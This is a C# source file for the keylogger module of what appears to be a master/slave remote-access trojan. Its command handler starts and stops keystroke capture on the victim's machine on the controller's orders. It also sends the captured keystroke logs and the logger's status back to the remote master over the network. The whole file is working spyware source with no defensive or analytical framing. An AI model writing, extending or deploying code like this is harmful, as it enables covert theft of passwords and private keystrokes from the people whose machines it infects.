using System.Collections.Generic;
using Shared;
using Slave.Commands.Core;

namespace Slave.Commands.KeyLogger
{
    internal class KeyLoggerCommand : ICommand
    {
        public string name { get; } = "keylogger";

        public KeyLoggerManager keyLoggerManager { get; set; } = new KeyLoggerManager();
        

        public void Process(List<string> args)
        {
            switch (args[0])
            {
                case "start":
                    StartKeylogger();
                    break;
                case "stop":
                    StopKeylogger();
                    break;
                case "status":
                    SendKeyloggerStatusToMaster();
                    break;
                case "dump":
                    SendKeyLogsToMaster();
                    break;
            }
        }

        void StartKeylogger()
        {
            keyLoggerManager.StartListening();
            SendKeyloggerStatusToMaster();
        }

        void StopKeylogger()
        {
            keyLoggerManager.StopListening();
            SendKeyloggerStatusToMaster();
        }

        void SendKeyloggerStatusToMaster() =>
            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "on" : "off");

        void SendKeyLogsToMaster() =>
            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.DumpLogs());
    }
}
